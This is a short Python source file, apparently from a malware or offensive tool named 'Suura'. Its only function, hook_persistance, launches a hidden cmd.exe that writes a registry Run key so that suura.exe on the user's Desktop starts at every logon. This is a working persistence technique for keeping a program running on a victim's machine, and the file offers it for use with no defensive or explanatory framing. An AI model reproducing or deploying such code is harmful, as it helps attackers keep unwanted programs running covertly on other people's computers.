import os
from Suura.includes.suura_subprocess import *

def hook_persistance():
    prcs = Process()
    prcs.command = "cmd.exe"
    prcs.process_type = ProcessType.open_hide_process
    prcs.parameter = r"/c reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v pers /t REG_SZ /d \"%s\"" % (os.path.join(os.path.expanduser("~"),"Desktop","suura.exe"))
    prcs.exec()
